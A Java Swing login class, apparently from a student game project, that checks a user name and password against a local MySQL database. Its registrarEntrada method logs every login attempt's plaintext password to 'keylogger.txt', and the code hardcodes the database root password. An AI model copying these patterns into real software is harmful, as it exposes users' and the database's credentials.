package proyecto;

// Bibliotecas necesarias para la GUI
import javax.swing.*;
// Bibliotecas para manejo de archivos
import java.io.*;
// Bibliotecas para conectarse a bases de datos
import java.sql.*;
// Bibliotecas para manejar fechas y horas
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

// Clase principal que gestiona el inicio de sesión
public class InicioSesion {

    // Método principal que maneja el flujo del inicio de sesión
    public void iniciarSesion() {
        // Bucle "while" para permitir múltiples intentos de inicio de sesión
        while (true) {
            // Solicitar al usuario que ingrese su nombre de usuario
            String nombre = JOptionPane.showInputDialog("Ingrese su Nombre de Usuario:");

            // Verificar si el usuario canceló la entrada del nombre de usuario
            if (nombre == null) {
                // Si el usuario presiona 'Cancelar' en el cuadro de diálogo, muestra un mensaje
                // de cancelación
                JOptionPane.showMessageDialog(null, "Inicio de sesión cancelado.",
                        "Cancelación de Sesión", JOptionPane.INFORMATION_MESSAGE);
                // Salir del bucle si se cancela el inicio de sesión
                break;
            }

            // Validar si el nombre de usuario está vacío
            if (nombre.trim().isEmpty()) {
                // Si el nombre de usuario es vacío o solo contiene espacios, muestra un mensaje
                // de error
                JOptionPane.showMessageDialog(null, "Debe ingresar su nombre de usuario.",
                        "Error de Sesión", JOptionPane.ERROR_MESSAGE);
                // Reiniciar el bucle y pedir el nombre de usuario nuevamente
                continue;
            }

            // Validar si el nombre de usuario contiene caracteres no válidos
            if (!esNombreValido(nombre)) {
                // Si el nombre contiene caracteres no permitidos (por ejemplo, números o
                // caracteres especiales), muestra un mensaje de error
                JOptionPane.showMessageDialog(null, "El nombre de usuario solo debe contener letras.",
                        "Error de Validación", JOptionPane.ERROR_MESSAGE);
                // Reiniciar el bucle y pedir el nombre de usuario nuevamente
                continue;
            }

            // Solicitar al usuario que ingrese su contraseña mediante un campo seguro
            // Crear un campo de texto para que el usuario ingrese su contraseña
            JPasswordField contraseñaField = new JPasswordField();

            // Mostrar un cuadro de diálogo para que el usuario ingrese la contraseña
            int option = JOptionPane.showConfirmDialog(null, contraseñaField, "Ingrese su Contraseña:",
                    JOptionPane.OK_CANCEL_OPTION); // El cuadro de diálogo tiene botones de OK y Cancelar

            // Verificar si el usuario canceló la entrada de la contraseña
            if (option != JOptionPane.OK_OPTION) {
                // Si el usuario presiona 'Cancelar' en el cuadro de diálogo, muestra un mensaje
                // de cancelación
                JOptionPane.showMessageDialog(null, "Inicio de sesión cancelado.",
                        "Cancelación de Sesión", JOptionPane.INFORMATION_MESSAGE);
                        // Salir del bucle si se cancela el inicio de sesión
                break; 
            }

            // Convertir la contraseña ingresada (char[]) a un formato String
            String contraseña = new String(contraseñaField.getPassword());

            // Validar si la contraseña está vacía
            if (contraseña.trim().isEmpty()) {
                // Si la contraseña está vacía o contiene solo espacios en blanco, muestra un
                // mensaje de error
                JOptionPane.showMessageDialog(null, "Debe ingresar una contraseña.",
                        "Error de Sesión", JOptionPane.ERROR_MESSAGE);
                        // Reiniciar el bucle y pedir la contraseña nuevamente
                continue; 
            }

            // Registrar el intento de inicio de sesión en un archivo keylogger
            registrarEntrada(nombre, contraseña);

            if (validarCredenciales(nombre, contraseña)) {
                JOptionPane.showMessageDialog(null, "Inicio de sesión exitoso.",
                        "Ingreso Realizado", JOptionPane.INFORMATION_MESSAGE);

                // Crear un objeto Registro con los datos del usuario autenticado
                Registro usuario = new Registro();
                usuario.setNombre(nombre);
                usuario.setContraseña(contraseña);

                // Guardar el usuario en la clase SesionActiva
                almacenarSesion.setUsuarioActivo(usuario);
                // Salir del bucle si las credenciales son correctas
                break; 
            }
        }
    }

   // Método para registrar los intentos de inicio de sesión (nombre de usuario y contraseña)
private void registrarEntrada(String nombre, String password) {
    // Ruta del archivo donde se registrarán los intentos de inicio de sesión
    String rutaArchivo = "keylogger.txt";
    try (FileWriter fw = new FileWriter(rutaArchivo, true);
        // BufferedWriter para mejorar la eficiencia de escritura
         BufferedWriter bw = new BufferedWriter(fw);  
         // PrintWriter para escribir líneas de texto de forma más fácil
         PrintWriter pw = new PrintWriter(bw)) {  

        // Obtener la fecha y hora actual
        LocalDateTime ahora = LocalDateTime.now();
        // Formatear la fecha y hora en el formato "yyyy-MM-dd HH:mm:ss"
        DateTimeFormatter formato = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
        // Convertir la fecha y hora a una cadena con el formato especificado
        String fechaHora = ahora.format(formato);  

        // Escribir el intento de inicio de sesión en el archivo
        pw.println("[" + fechaHora + "] Usuario: " + nombre + ", Contraseña: " + password);
        // Si ocurre algún error en la escritura o manejo de los archivos, se captura y maneja en el bloque catch
    } catch (IOException e) {
        // Si ocurre un error al escribir en el archivo, muestra un mensaje de error en la consola
        System.err.println("Error al escribir en el archivo keylogger:");
        // Imprime el detalle del error
        e.printStackTrace();  
    }
}


    // Método para validar que el nombre de usuario contenga solo letras y espacios
    public static boolean esNombreValido(String nombre) {
        // Iterar por cada carácter del nombre
        for (char c : nombre.toCharArray()) {
            // Verificar si no es letra o espacio
            if (!Character.isLetter(c) && !Character.isWhitespace(c)) {
                // Retornar false si encuentra un carácter inválido
                return false;
            }
        }
        return true; // Retornar true si todos los caracteres son válidos
    }

    // Método para validar las credenciales contra una base de datos
    public static boolean validarCredenciales(String nombre, String password) {
        // Objeto para manejar la conexión a la base de datos
        Connection conn = null;
        // Objeto para preparar y ejecutar consultas SQL
        PreparedStatement stmt = null;
        // Objeto para almacenar los resultados de la consulta
        ResultSet rs = null;

        try {
            // Conectar a la base de datos usando los parámetros especificados
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/Juego", "root", "Mantismarina2");

            // Preparar la consulta SQL para buscar las credenciales
            String sql = "SELECT * FROM Registro WHERE nombre = ? AND password = ?";
            stmt = conn.prepareStatement(sql);
            // Establecer el nombre como parámetro
            stmt.setString(1, nombre);
            // Establecer la contraseña como parámetro
            stmt.setString(2, password);
            // Ejecutar la consulta
            rs = stmt.executeQuery();

            // Retornar true si se encuentra un registro que coincide
            return rs.next();
            // Captura cualquier excepción relacionada con SQL
        } catch (SQLException e) {  
            // Imprime un mensaje de error en la consola
            System.err.println("Error al conectar con la base de datos:"); 
            // Muestra el detalle del error (stack trace) en la consola 
            e.printStackTrace();  
            // Devuelve 'false' para indicar que ocurrió un error en la operación
            return false;  
        // El bloque 'finally' siempre se ejecuta, independientemente si ocurre o no una excepción
        } finally {  
            // Cerrar los recursos utilizados para evitar fugas de memoria
            try {
                // Si el objeto 'rs' (ResultSet) no es nulo, se cierra
                if (rs != null)
                // Cierra el ResultSet  
                    rs.close();   
                    // Si el objeto 'stmt' (Statement) no es nulo, se cierra
                if (stmt != null)  
                // Cierra el Statement
                    stmt.close();   
                    // Si el objeto 'conn' (Connection) no es nulo, se cierra
                if (conn != null) 
                // Cierra la conexión a la base de datos 
                    conn.close();  
                    // Captura excepciones al intentar cerrar los recursos 
            } catch (SQLException e) {  
                // Imprime un mensaje de error al intentar cerrar recursos
                System.err.println("Error al cerrar recursos:");  
                // Muestra el detalle del error en la consola
                e.printStackTrace();  
            }
        }
    }
}